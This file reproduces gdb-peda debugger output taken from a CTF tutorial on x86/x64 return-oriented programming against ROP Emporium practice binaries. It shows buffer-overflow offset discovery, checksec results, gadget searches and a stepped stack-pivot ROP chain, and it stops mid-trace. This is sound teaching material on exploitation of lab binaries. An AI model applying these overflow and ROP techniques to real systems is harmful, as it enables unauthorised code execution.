@@ -1,0 +1,663 @@
+# SOURCE: https://github.com/firmianay/CTF-All-In-One/blob/HEAD/doc/3.1.4_rop_x86.md
+# (fenced code blocks containing PEDA output, verbatim; blocks separated by a line "# ---- block ----")
+# ---- block ----
+gdb-peda$ disassemble pwnme
+Dump of assembler code for function pwnme:
+   0x080485f6 <+0>:     push   ebp
+   0x080485f7 <+1>:     mov    ebp,esp
+   0x080485f9 <+3>:     sub    esp,0x28
+   0x080485fc <+6>:     sub    esp,0x4
+   0x080485ff <+9>:     push   0x20
+   0x08048601 <+11>:    push   0x0
+   0x08048603 <+13>:    lea    eax,[ebp-0x28]
+   0x08048606 <+16>:    push   eax
+   0x08048607 <+17>:    call   0x8048460 <memset@plt>
+   0x0804860c <+22>:    add    esp,0x10
+   0x0804860f <+25>:    sub    esp,0xc
+   0x08048612 <+28>:    push   0x804873c
+   0x08048617 <+33>:    call   0x8048420 <puts@plt>
+   0x0804861c <+38>:    add    esp,0x10
+   0x0804861f <+41>:    sub    esp,0xc
+   0x08048622 <+44>:    push   0x80487bc
+   0x08048627 <+49>:    call   0x8048420 <puts@plt>
+   0x0804862c <+54>:    add    esp,0x10
+   0x0804862f <+57>:    sub    esp,0xc
+   0x08048632 <+60>:    push   0x8048821
+   0x08048637 <+65>:    call   0x8048400 <printf@plt>
+   0x0804863c <+70>:    add    esp,0x10
+   0x0804863f <+73>:    mov    eax,ds:0x804a060
+   0x08048644 <+78>:    sub    esp,0x4
+   0x08048647 <+81>:    push   eax
+   0x08048648 <+82>:    push   0x32
+   0x0804864a <+84>:    lea    eax,[ebp-0x28]
+   0x0804864d <+87>:    push   eax
+   0x0804864e <+88>:    call   0x8048410 <fgets@plt>
+   0x08048653 <+93>:    add    esp,0x10
+   0x08048656 <+96>:    nop
+   0x08048657 <+97>:    leave  
+   0x08048658 <+98>:    ret
+End of assembler dump.
+gdb-peda$ disassemble ret2win
+Dump of assembler code for function ret2win:
+   0x08048659 <+0>:     push   ebp
+   0x0804865a <+1>:     mov    ebp,esp
+   0x0804865c <+3>:     sub    esp,0x8
+   0x0804865f <+6>:     sub    esp,0xc
+   0x08048662 <+9>:     push   0x8048824
+   0x08048667 <+14>:    call   0x8048400 <printf@plt>
+   0x0804866c <+19>:    add    esp,0x10
+   0x0804866f <+22>:    sub    esp,0xc
+   0x08048672 <+25>:    push   0x8048841
+   0x08048677 <+30>:    call   0x8048430 <system@plt>
+   0x0804867c <+35>:    add    esp,0x10
+   0x0804867f <+38>:    nop
+   0x08048680 <+39>:    leave  
+   0x08048681 <+40>:    ret
+End of assembler dump.
+# ---- block ----
+gdb-peda$ pattern_create 50
+'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbA'
+gdb-peda$ r
+Starting program: /home/firmy/Desktop/rop_emporium/ret2win32/ret2win32
+ret2win by ROP Emporium
+32bits
+
+For my first trick, I will attempt to fit 50 bytes of user input into 32 bytes of stack buffer;
+What could possibly go wrong?
+You there madam, may I have your input please? And don't worry about null bytes, we're using fgets!
+
+> AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbA
+
+Program received signal SIGSEGV, Segmentation fault.
+[----------------------------------registers-----------------------------------]
+EAX: 0xffffd5c0 ("AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAb")
+EBX: 0x0
+ECX: 0xffffd5c0 ("AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAb")
+EDX: 0xf7f90860 --> 0x0
+ESI: 0xf7f8ee28 --> 0x1d1d30
+EDI: 0x0
+EBP: 0x41304141 ('AA0A')
+ESP: 0xffffd5f0 --> 0xf7f80062 --> 0x41000000 ('')
+EIP: 0x41414641 ('AFAA')
+EFLAGS: 0x10286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+Invalid $PC address: 0x41414641
+[------------------------------------stack-------------------------------------]
+0000| 0xffffd5f0 --> 0xf7f80062 --> 0x41000000 ('')
+0004| 0xffffd5f4 --> 0xffffd610 --> 0x1
+0008| 0xffffd5f8 --> 0x0
+0012| 0xffffd5fc --> 0xf7dd57c3 (<__libc_start_main+243>:       add    esp,0x10)
+0016| 0xffffd600 --> 0xf7f8ee28 --> 0x1d1d30
+0020| 0xffffd604 --> 0xf7f8ee28 --> 0x1d1d30
+0024| 0xffffd608 --> 0x0
+0028| 0xffffd60c --> 0xf7dd57c3 (<__libc_start_main+243>:       add    esp,0x10)
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+Stopped reason: SIGSEGV
+0x41414641 in ?? ()
+gdb-peda$ pattern_offset $ebp
+1093681473 found at offset: 40
+gdb-peda$ pattern_offset $eip
+1094796865 found at offset: 44
+# ---- block ----
+gdb-peda$ checksec
+CANARY    : disabled
+FORTIFY   : disabled
+NX        : ENABLED
+PIE       : disabled
+RELRO     : Partial
+# ---- block ----
+gdb-peda$ disassemble pwnme
+Dump of assembler code for function pwnme:
+   0x00000000004007b5 <+0>:     push   rbp
+   0x00000000004007b6 <+1>:     mov    rbp,rsp
+   0x00000000004007b9 <+4>:     sub    rsp,0x20
+   0x00000000004007bd <+8>:     lea    rax,[rbp-0x20]
+   0x00000000004007c1 <+12>:    mov    edx,0x20
+   0x00000000004007c6 <+17>:    mov    esi,0x0
+   0x00000000004007cb <+22>:    mov    rdi,rax
+   0x00000000004007ce <+25>:    call   0x400600 <memset@plt>
+   0x00000000004007d3 <+30>:    mov    edi,0x4008f8
+   0x00000000004007d8 <+35>:    call   0x4005d0 <puts@plt>
+   0x00000000004007dd <+40>:    mov    edi,0x400978
+   0x00000000004007e2 <+45>:    call   0x4005d0 <puts@plt>
+   0x00000000004007e7 <+50>:    mov    edi,0x4009dd
+   0x00000000004007ec <+55>:    mov    eax,0x0
+   0x00000000004007f1 <+60>:    call   0x4005f0 <printf@plt>
+   0x00000000004007f6 <+65>:    mov    rdx,QWORD PTR [rip+0x200873]        # 0x601070 <stdin@@GLIBC_2.2.5>
+   0x00000000004007fd <+72>:    lea    rax,[rbp-0x20]
+   0x0000000000400801 <+76>:    mov    esi,0x32
+   0x0000000000400806 <+81>:    mov    rdi,rax
+   0x0000000000400809 <+84>:    call   0x400620 <fgets@plt>
+   0x000000000040080e <+89>:    nop
+   0x000000000040080f <+90>:    leave  
+   0x0000000000400810 <+91>:    ret
+End of assembler dump.
+gdb-peda$ disassemble ret2win
+Dump of assembler code for function ret2win:
+   0x0000000000400811 <+0>:     push   rbp
+   0x0000000000400812 <+1>:     mov    rbp,rsp
+   0x0000000000400815 <+4>:     mov    edi,0x4009e0
+   0x000000000040081a <+9>:     mov    eax,0x0
+   0x000000000040081f <+14>:    call   0x4005f0 <printf@plt>
+   0x0000000000400824 <+19>:    mov    edi,0x4009fd
+   0x0000000000400829 <+24>:    call   0x4005e0 <system@plt>
+   0x000000000040082e <+29>:    nop
+   0x000000000040082f <+30>:    pop    rbp
+   0x0000000000400830 <+31>:    ret
+End of assembler dump.
+# ---- block ----
+gdb-peda$ r
+Starting program: /home/firmy/Desktop/rop_emporium/ret2win/ret2win
+ret2win by ROP Emporium
+64bits
+
+For my first trick, I will attempt to fit 50 bytes of user input into 32 bytes of stack buffer;
+What could possibly go wrong?
+You there madam, may I have your input please? And don't worry about null bytes, we're using fgets!
+
+> AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbA
+
+Program received signal SIGSEGV, Segmentation fault.
+[----------------------------------registers-----------------------------------]
+RAX: 0x7fffffffe400 ("AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAb")
+RBX: 0x0
+RCX: 0x1f
+RDX: 0x7ffff7dd4710 --> 0x0
+RSI: 0x7fffffffe400 ("AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAb")
+RDI: 0x7fffffffe401 ("AA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAb")
+RBP: 0x6141414541412941 ('A)AAEAAa')
+RSP: 0x7fffffffe428 ("AA0AAFAAb")
+RIP: 0x400810 (<pwnme+91>:      ret)
+R8 : 0x0
+R9 : 0x7ffff7fb94c0 (0x00007ffff7fb94c0)
+R10: 0x602260 ("AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbA\n")
+R11: 0x246
+R12: 0x400650 (<_start>:        xor    ebp,ebp)
+R13: 0x7fffffffe510 --> 0x1
+R14: 0x0
+R15: 0x0
+EFLAGS: 0x10246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+   0x400809 <pwnme+84>: call   0x400620 <fgets@plt>
+   0x40080e <pwnme+89>: nop
+   0x40080f <pwnme+90>: leave  
+=> 0x400810 <pwnme+91>: ret
+   0x400811 <ret2win>:  push   rbp
+   0x400812 <ret2win+1>:        mov    rbp,rsp
+   0x400815 <ret2win+4>:        mov    edi,0x4009e0
+   0x40081a <ret2win+9>:        mov    eax,0x0
+[------------------------------------stack-------------------------------------]
+0000| 0x7fffffffe428 ("AA0AAFAAb")
+0008| 0x7fffffffe430 --> 0x400062 --> 0x1f8000000000000
+0016| 0x7fffffffe438 --> 0x7ffff7a41f6a (<__libc_start_main+234>:       mov    edi,eax)
+0024| 0x7fffffffe440 --> 0x0
+0032| 0x7fffffffe448 --> 0x7fffffffe518 --> 0x7fffffffe870 ("/home/firmy/Desktop/rop_emporium/ret2win/ret2win")
+0040| 0x7fffffffe450 --> 0x100000000
+0048| 0x7fffffffe458 --> 0x400746 (<main>:      push   rbp)
+0056| 0x7fffffffe460 --> 0x0
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+Stopped reason: SIGSEGV
+0x0000000000400810 in pwnme ()
+gdb-peda$ pattern_offset $rbp
+7007954260868540737 found at offset: 32
+gdb-peda$ pattern_offset AA0AAFAAb
+AA0AAFAAb found at offset: 40
+# ---- block ----
+gdb-peda$ disassemble usefulFunction
+Dump of assembler code for function usefulFunction:
+   0x08048649 <+0>:     push   ebp
+   0x0804864a <+1>:     mov    ebp,esp
+   0x0804864c <+3>:     sub    esp,0x8
+   0x0804864f <+6>:     sub    esp,0xc
+   0x08048652 <+9>:     push   0x8048747
+   0x08048657 <+14>:    call   0x8048430 <system@plt>
+   0x0804865c <+19>:    add    esp,0x10
+   0x0804865f <+22>:    nop
+   0x08048660 <+23>:    leave  
+   0x08048661 <+24>:    ret
+End of assembler dump.
+# ---- block ----
+gdb-peda$ disassemble system
+Dump of assembler code for function system@plt:
+   0x08048430 <+0>:     jmp    DWORD PTR ds:0x804a018
+   0x08048436 <+6>:     push   0x18
+   0x0804843b <+11>:    jmp    0x80483f0
+gdb-peda$ x/5x 0x804a018  
+0x804a018:      0x08048436      0x08048446      0x08048456      0x08048466
+0x804a028:      0x00000000
+# ---- block ----
+gdb-peda$ disassemble system
+Dump of assembler code for function system:
+   0xf7df9c50 <+0>:     sub    esp,0xc
+   0xf7df9c53 <+3>:     mov    eax,DWORD PTR [esp+0x10]
+   0xf7df9c57 <+7>:     call   0xf7ef32cd <__x86.get_pc_thunk.dx>
+   0xf7df9c5c <+12>:    add    edx,0x1951cc
+   0xf7df9c62 <+18>:    test   eax,eax
+   0xf7df9c64 <+20>:    je     0xf7df9c70 <system+32>
+   0xf7df9c66 <+22>:    add    esp,0xc
+   0xf7df9c69 <+25>:    jmp    0xf7df9700 <do_system>
+   0xf7df9c6e <+30>:    xchg   ax,ax
+   0xf7df9c70 <+32>:    lea    eax,[edx-0x57616]
+   0xf7df9c76 <+38>:    call   0xf7df9700 <do_system>
+   0xf7df9c7b <+43>:    test   eax,eax
+   0xf7df9c7d <+45>:    sete   al
+   0xf7df9c80 <+48>:    add    esp,0xc
+   0xf7df9c83 <+51>:    movzx  eax,al
+   0xf7df9c86 <+54>:    ret
+End of assembler dump.
+gdb-peda$ x/5x 0x08048430
+0x8048430 <system@plt>: 0xa01825ff      0x18680804      0xe9000000      0xffffffb0
+0x8048440 <__libc_start_main@plt>:      0xa01c25ff
+# ---- block ----
+gdb-peda$ disassemble usefulFunction
+Dump of assembler code for function usefulFunction:
+   0x0000000000400807 <+0>:     push   rbp
+   0x0000000000400808 <+1>:     mov    rbp,rsp
+   0x000000000040080b <+4>:     mov    edi,0x4008ff
+   0x0000000000400810 <+9>:     call   0x4005e0 <system@plt>
+   0x0000000000400815 <+14>:    nop
+   0x0000000000400816 <+15>:    pop    rbp
+   0x0000000000400817 <+16>:    ret
+End of assembler dump.
+# ---- block ----
+gdb-peda$ ropsearch "pop rdi; ret"
+Searching for ROP gadget: 'pop rdi; ret' in: binary ranges
+0x00400883 : (b'5fc3')  pop rdi; ret
+# ---- block ----
+gdb-peda$ disassemble system
+Dump of assembler code for function system:
+   0x00007ffff7a63010 <+0>:     test   rdi,rdi
+   0x00007ffff7a63013 <+3>:     je     0x7ffff7a63020 <system+16>
+   0x00007ffff7a63015 <+5>:     jmp    0x7ffff7a62a70 <do_system>
+   0x00007ffff7a6301a <+10>:    nop    WORD PTR [rax+rax*1+0x0]
+   0x00007ffff7a63020 <+16>:    lea    rdi,[rip+0x138fd6]        # 0x7ffff7b9bffd
+   0x00007ffff7a63027 <+23>:    sub    rsp,0x8
+   0x00007ffff7a6302b <+27>:    call   0x7ffff7a62a70 <do_system>
+   0x00007ffff7a63030 <+32>:    test   eax,eax
+   0x00007ffff7a63032 <+34>:    sete   al
+   0x00007ffff7a63035 <+37>:    add    rsp,0x8
+   0x00007ffff7a63039 <+41>:    movzx  eax,al
+   0x00007ffff7a6303c <+44>:    ret
+End of assembler dump.
+# ---- block ----
+gdb-peda$ ropsearch "add esp, 8"
+Searching for ROP gadget: 'add esp, 8' in: binary ranges
+0x08048576 : (b'83c4085bc3')    add esp,0x8; pop ebx; ret
+0x080488c3 : (b'83c4085bc3')    add esp,0x8; pop ebx; ret
+# ---- block ----
+gdb-peda$ ropsearch "pop rdi; pop rsi"
+Searching for ROP gadget: 'pop rdi; pop rsi' in: binary ranges
+0x00401ab0 : (b'5f5e5ac3')      pop rdi; pop rsi; pop rdx; ret
+# ---- block ----
+gdb-peda$ disassemble checkBadchars
+Dump of assembler code for function checkBadchars:
+   0x08048801 <+0>:     push   ebp
+   0x08048802 <+1>:     mov    ebp,esp
+   0x08048804 <+3>:     sub    esp,0x10
+   0x08048807 <+6>:     mov    BYTE PTR [ebp-0x10],0x62
+   0x0804880b <+10>:    mov    BYTE PTR [ebp-0xf],0x69
+   0x0804880f <+14>:    mov    BYTE PTR [ebp-0xe],0x63
+   0x08048813 <+18>:    mov    BYTE PTR [ebp-0xd],0x2f
+   0x08048817 <+22>:    mov    BYTE PTR [ebp-0xc],0x20
+   0x0804881b <+26>:    mov    BYTE PTR [ebp-0xb],0x66
+   0x0804881f <+30>:    mov    BYTE PTR [ebp-0xa],0x6e
+   0x08048823 <+34>:    mov    BYTE PTR [ebp-0x9],0x73
+   0x08048827 <+38>:    mov    DWORD PTR [ebp-0x4],0x0
+   0x0804882e <+45>:    mov    DWORD PTR [ebp-0x8],0x0
+   0x08048835 <+52>:    mov    DWORD PTR [ebp-0x4],0x0
+   0x0804883c <+59>:    jmp    0x804887c <checkBadchars+123>
+   0x0804883e <+61>:    mov    DWORD PTR [ebp-0x8],0x0
+   0x08048845 <+68>:    jmp    0x8048872 <checkBadchars+113>
+   0x08048847 <+70>:    mov    edx,DWORD PTR [ebp+0x8]
+   0x0804884a <+73>:    mov    eax,DWORD PTR [ebp-0x4]
+   0x0804884d <+76>:    add    eax,edx
+   0x0804884f <+78>:    movzx  edx,BYTE PTR [eax]
+   0x08048852 <+81>:    lea    ecx,[ebp-0x10]
+   0x08048855 <+84>:    mov    eax,DWORD PTR [ebp-0x8]
+   0x08048858 <+87>:    add    eax,ecx
+   0x0804885a <+89>:    movzx  eax,BYTE PTR [eax]
+   0x0804885d <+92>:    cmp    dl,al
+   0x0804885f <+94>:    jne    0x804886e <checkBadchars+109>
+   0x08048861 <+96>:    mov    edx,DWORD PTR [ebp+0x8]
+   0x08048864 <+99>:    mov    eax,DWORD PTR [ebp-0x4]
+   0x08048867 <+102>:   add    eax,edx
+   0x08048869 <+104>:   mov    BYTE PTR [eax],0xeb
+   0x0804886c <+107>:   jmp    0x8048878 <checkBadchars+119>
+   0x0804886e <+109>:   add    DWORD PTR [ebp-0x8],0x1
+   0x08048872 <+113>:   cmp    DWORD PTR [ebp-0x8],0x7
+   0x08048876 <+117>:   jbe    0x8048847 <checkBadchars+70>
+   0x08048878 <+119>:   add    DWORD PTR [ebp-0x4],0x1
+   0x0804887c <+123>:   mov    eax,DWORD PTR [ebp-0x4]
+   0x0804887f <+126>:   cmp    eax,DWORD PTR [ebp+0xc]
+   0x08048882 <+129>:   jb     0x804883e <checkBadchars+61>
+   0x08048884 <+131>:   nop
+   0x08048885 <+132>:   leave  
+   0x08048886 <+133>:   ret
+End of assembler dump.
+# ---- block ----
+gdb-peda$ b *0x0804889f
+Breakpoint 1 at 0x804889f
+gdb-peda$ c
+Continuing.
+[----------------------------------registers-----------------------------------]
+EAX: 0xffe7ec40 ('A' <repeats 40 times>, "\f\317U\367\237\210\004\b\n")
+EBX: 0x0
+ECX: 0xffe7ec40 ('A' <repeats 40 times>, "\f\317U\367\237\210\004\b\n")
+EDX: 0xf7731860 --> 0x0
+ESI: 0xf772fe28 --> 0x1d1d30
+EDI: 0x0
+EBP: 0xffe7ec68 --> 0xf755cf0c --> 0x0
+ESP: 0xffe7ec40 ('A' <repeats 40 times>, "\f\317U\367\237\210\004\b\n")
+EIP: 0x804889f (<pwnme+173>:    leave)
+EFLAGS: 0x282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+   0x8048896 <pwnme+164>:       call   0x80485b0 <fgets@plt>
+   0x804889b <pwnme+169>:       add    esp,0x10
+   0x804889e <pwnme+172>:       nop
+=> 0x804889f <pwnme+173>:       leave  
+   0x80488a0 <pwnme+174>:       ret
+   0x80488a1 <uselessFunction>: push   ebp
+   0x80488a2 <uselessFunction+1>:       mov    ebp,esp
+   0x80488a4 <uselessFunction+3>:       sub    esp,0x8
+[------------------------------------stack-------------------------------------]
+0000| 0xffe7ec40 ('A' <repeats 40 times>, "\f\317U\367\237\210\004\b\n")
+0004| 0xffe7ec44 ('A' <repeats 36 times>, "\f\317U\367\237\210\004\b\n")
+0008| 0xffe7ec48 ('A' <repeats 32 times>, "\f\317U\367\237\210\004\b\n")
+0012| 0xffe7ec4c ('A' <repeats 28 times>, "\f\317U\367\237\210\004\b\n")
+0016| 0xffe7ec50 ('A' <repeats 24 times>, "\f\317U\367\237\210\004\b\n")
+0020| 0xffe7ec54 ('A' <repeats 20 times>, "\f\317U\367\237\210\004\b\n")
+0024| 0xffe7ec58 ('A' <repeats 16 times>, "\f\317U\367\237\210\004\b\n")
+0028| 0xffe7ec5c ('A' <repeats 12 times>, "\f\317U\367\237\210\004\b\n")
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+
+Breakpoint 1, 0x0804889f in pwnme ()
+gdb-peda$ x/10w 0xffe7ec68
+0xffe7ec68:     0xf755cf0c      0x0804889f      0xf755000a      0x00000000
+0xffe7ec78:     0x00000002      0x00000000      0x00000001      0xffe7ed44
+0xffe7ec88:     0xf755cf10      0xf655d010
+gdb-peda$ x/10w 0xf755cf0c
+0xf755cf0c:     0x00000000      0x080485f0      0x080488c0      0x0804a024
+0xf755cf1c:     0x080488c4      0x08048571      0x000001f7      0x080488c7
+0xf755cf2c:     0x080486a3      0x0000000a
+# ---- block ----
+gdb-peda$ n
+[----------------------------------registers-----------------------------------]
+EAX: 0xffe7ec40 ('A' <repeats 40 times>, "\f\317U\367\237\210\004\b\n")
+EBX: 0x0
+ECX: 0xffe7ec40 ('A' <repeats 40 times>, "\f\317U\367\237\210\004\b\n")
+EDX: 0xf7731860 --> 0x0
+ESI: 0xf772fe28 --> 0x1d1d30
+EDI: 0x0
+EBP: 0xf755cf0c --> 0x0
+ESP: 0xffe7ec6c --> 0x804889f (<pwnme+173>:     leave)
+EIP: 0x80488a0 (<pwnme+174>:    ret)
+EFLAGS: 0x282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+   0x804889b <pwnme+169>:       add    esp,0x10
+   0x804889e <pwnme+172>:       nop
+   0x804889f <pwnme+173>:       leave  
+=> 0x80488a0 <pwnme+174>:       ret
+   0x80488a1 <uselessFunction>: push   ebp
+   0x80488a2 <uselessFunction+1>:       mov    ebp,esp
+   0x80488a4 <uselessFunction+3>:       sub    esp,0x8
+   0x80488a7 <uselessFunction+6>:       call   0x80485f0 <foothold_function@plt>
+[------------------------------------stack-------------------------------------]
+0000| 0xffe7ec6c --> 0x804889f (<pwnme+173>:    leave)
+0004| 0xffe7ec70 --> 0xf755000a --> 0x0
+0008| 0xffe7ec74 --> 0x0
+0012| 0xffe7ec78 --> 0x2
+0016| 0xffe7ec7c --> 0x0
+0020| 0xffe7ec80 --> 0x1
+0024| 0xffe7ec84 --> 0xffe7ed44 --> 0xffe808cf ("./pivot32")
+0028| 0xffe7ec88 --> 0xf755cf10 --> 0x80485f0 (<foothold_function@plt>: jmp    DWORD PTR ds:0x804a024)
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+0x080488a0 in pwnme ()
+# ---- block ----
+gdb-peda$ n
+[----------------------------------registers-----------------------------------]
+EAX: 0xffe7ec40 ('A' <repeats 40 times>, "\f\317U\367\237\210\004\b\n")
+EBX: 0x0
+ECX: 0xffe7ec40 ('A' <repeats 40 times>, "\f\317U\367\237\210\004\b\n")
+EDX: 0xf7731860 --> 0x0
+ESI: 0xf772fe28 --> 0x1d1d30
+EDI: 0x0
+EBP: 0xf755cf0c --> 0x0
+ESP: 0xffe7ec70 --> 0xf755000a --> 0x0
+EIP: 0x804889f (<pwnme+173>:    leave)
+EFLAGS: 0x282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+   0x8048896 <pwnme+164>:       call   0x80485b0 <fgets@plt>
+   0x804889b <pwnme+169>:       add    esp,0x10
+   0x804889e <pwnme+172>:       nop
+=> 0x804889f <pwnme+173>:       leave  
+   0x80488a0 <pwnme+174>:       ret
+   0x80488a1 <uselessFunction>: push   ebp
+   0x80488a2 <uselessFunction+1>:       mov    ebp,esp
+   0x80488a4 <uselessFunction+3>:       sub    esp,0x8
+[------------------------------------stack-------------------------------------]
+0000| 0xffe7ec70 --> 0xf755000a --> 0x0
+0004| 0xffe7ec74 --> 0x0
+0008| 0xffe7ec78 --> 0x2
+0012| 0xffe7ec7c --> 0x0
+0016| 0xffe7ec80 --> 0x1
+0020| 0xffe7ec84 --> 0xffe7ed44 --> 0xffe808cf ("./pivot32")
+0024| 0xffe7ec88 --> 0xf755cf10 --> 0x80485f0 (<foothold_function@plt>: jmp    DWORD PTR ds:0x804a024)
+0028| 0xffe7ec8c --> 0xf655d010 --> 0x0
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+
+Breakpoint 1, 0x0804889f in pwnme ()
+# ---- block ----
+gdb-peda$ n
+[----------------------------------registers-----------------------------------]
+EAX: 0xffe7ec40 ('A' <repeats 40 times>, "\f\317U\367\237\210\004\b\n")
+EBX: 0x0
+ECX: 0xffe7ec40 ('A' <repeats 40 times>, "\f\317U\367\237\210\004\b\n")
+EDX: 0xf7731860 --> 0x0
+ESI: 0xf772fe28 --> 0x1d1d30
+EDI: 0x0
+EBP: 0x0
+ESP: 0xf755cf10 --> 0x80485f0 (<foothold_function@plt>: jmp    DWORD PTR ds:0x804a024)
+EIP: 0x80488a0 (<pwnme+174>:    ret)
+EFLAGS: 0x282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+   0x804889b <pwnme+169>:       add    esp,0x10
+   0x804889e <pwnme+172>:       nop
+   0x804889f <pwnme+173>:       leave  
+=> 0x80488a0 <pwnme+174>:       ret
+   0x80488a1 <uselessFunction>: push   ebp
+   0x80488a2 <uselessFunction+1>:       mov    ebp,esp
+   0x80488a4 <uselessFunction+3>:       sub    esp,0x8
+   0x80488a7 <uselessFunction+6>:       call   0x80485f0 <foothold_function@plt>
+[------------------------------------stack-------------------------------------]
+0000| 0xf755cf10 --> 0x80485f0 (<foothold_function@plt>:        jmp    DWORD PTR ds:0x804a024)
+0004| 0xf755cf14 --> 0x80488c0 (<usefulGadgets>:        pop    eax)
+0008| 0xf755cf18 --> 0x804a024 --> 0x80485f6 (<foothold_function@plt+6>:        push   0x30)
+0012| 0xf755cf1c --> 0x80488c4 (<usefulGadgets+4>:      mov    eax,DWORD PTR [eax])
+0016| 0xf755cf20 --> 0x8048571 (<_init+33>:     pop    ebx)
+0020| 0xf755cf24 --> 0x1f7
+0024| 0xf755cf28 --> 0x80488c7 (<usefulGadgets+7>:      add    eax,ebx)
+0028| 0xf755cf2c --> 0x80486a3 (<deregister_tm_clones+35>:      call   eax)
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+0x080488a0 in pwnme ()
+gdb-peda$ x/10w 0xf755cf10
+0xf755cf10:     0x080485f0      0x080488c0      0x0804a024      0x080488c4
+0xf755cf20:     0x08048571      0x000001f7      0x080488c7      0x080486a3
+0xf755cf30:     0x0000000a      0x00000000
+# ---- block ----
+gdb-peda$ n
+[----------------------------------registers-----------------------------------]
+EAX: 0xffe7ec40 ('A' <repeats 40 times>, "\f\317U\367\237\210\004\b\n")
+EBX: 0x0
+ECX: 0xffe7ec40 ('A' <repeats 40 times>, "\f\317U\367\237\210\004\b\n")
+EDX: 0xf7731860 --> 0x0
+ESI: 0xf772fe28 --> 0x1d1d30
+EDI: 0x0
+EBP: 0x0
+ESP: 0xf755cf14 --> 0x80488c0 (<usefulGadgets>: pop    eax)
+EIP: 0x80485f0 (<foothold_function@plt>:        jmp    DWORD PTR ds:0x804a024)
+EFLAGS: 0x282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+   0x80485e0 <exit@plt>:        jmp    DWORD PTR ds:0x804a020
+   0x80485e6 <exit@plt+6>:      push   0x28
+   0x80485eb <exit@plt+11>:     jmp    0x8048580
+=> 0x80485f0 <foothold_function@plt>:   jmp    DWORD PTR ds:0x804a024
+ | 0x80485f6 <foothold_function@plt+6>: push   0x30
+ | 0x80485fb <foothold_function@plt+11>:        jmp    0x8048580
+ | 0x8048600 <__libc_start_main@plt>:   jmp    DWORD PTR ds:0x804a028
+ | 0x8048606 <__libc_start_main@plt+6>: push   0x38
+ |->   0x80485f6 <foothold_function@plt+6>:     push   0x30
+       0x80485fb <foothold_function@plt+11>:    jmp    0x8048580
+       0x8048600 <__libc_start_main@plt>:       jmp    DWORD PTR ds:0x804a028
+       0x8048606 <__libc_start_main@plt+6>:     push   0x38
+                                                                  JUMP is taken
+[------------------------------------stack-------------------------------------]
+0000| 0xf755cf14 --> 0x80488c0 (<usefulGadgets>:        pop    eax)
+0004| 0xf755cf18 --> 0x804a024 --> 0x80485f6 (<foothold_function@plt+6>:        push   0x30)
+0008| 0xf755cf1c --> 0x80488c4 (<usefulGadgets+4>:      mov    eax,DWORD PTR [eax])
+0012| 0xf755cf20 --> 0x8048571 (<_init+33>:     pop    ebx)
+0016| 0xf755cf24 --> 0x1f7
+0020| 0xf755cf28 --> 0x80488c7 (<usefulGadgets+7>:      add    eax,ebx)
+0024| 0xf755cf2c --> 0x80486a3 (<deregister_tm_clones+35>:      call   eax)
+0028| 0xf755cf30 --> 0xa ('\n')
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+0x080485f0 in foothold_function@plt ()
+# ---- block ----
+gdb-peda$ n
+[----------------------------------registers-----------------------------------]
+EAX: 0x54 ('T')
+EBX: 0x0
+ECX: 0x54 ('T')
+EDX: 0xf7731854 --> 0x0
+ESI: 0xf772fe28 --> 0x1d1d30
+EDI: 0x0
+EBP: 0x0
+ESP: 0xf755cf18 --> 0x804a024 --> 0xf7772770 (<foothold_function>:      push   ebp)
+EIP: 0x80488c0 (<usefulGadgets>:        pop    eax)
+EFLAGS: 0x282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+   0x80488ba:   xchg   ax,ax
+   0x80488bc:   xchg   ax,ax
+   0x80488be:   xchg   ax,ax
+=> 0x80488c0 <usefulGadgets>:   pop    eax
+   0x80488c1 <usefulGadgets+1>: ret
+   0x80488c2 <usefulGadgets+2>: xchg   esp,eax
+   0x80488c3 <usefulGadgets+3>: ret
+   0x80488c4 <usefulGadgets+4>: mov    eax,DWORD PTR [eax]
+[------------------------------------stack-------------------------------------]
+0000| 0xf755cf18 --> 0x804a024 --> 0xf7772770 (<foothold_function>:     push   ebp)
+0004| 0xf755cf1c --> 0x80488c4 (<usefulGadgets+4>:      mov    eax,DWORD PTR [eax])
+0008| 0xf755cf20 --> 0x8048571 (<_init+33>:     pop    ebx)
+0012| 0xf755cf24 --> 0x1f7
+0016| 0xf755cf28 --> 0x80488c7 (<usefulGadgets+7>:      add    eax,ebx)
+0020| 0xf755cf2c --> 0x80486a3 (<deregister_tm_clones+35>:      call   eax)
+0024| 0xf755cf30 --> 0xa ('\n')
+0028| 0xf755cf34 --> 0x0
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+0x080488c0 in usefulGadgets ()
+gdb-peda$ n
+[----------------------------------registers-----------------------------------]
+EAX: 0x804a024 --> 0xf7772770 (<foothold_function>:     push   ebp)
+EBX: 0x0
+ECX: 0x54 ('T')
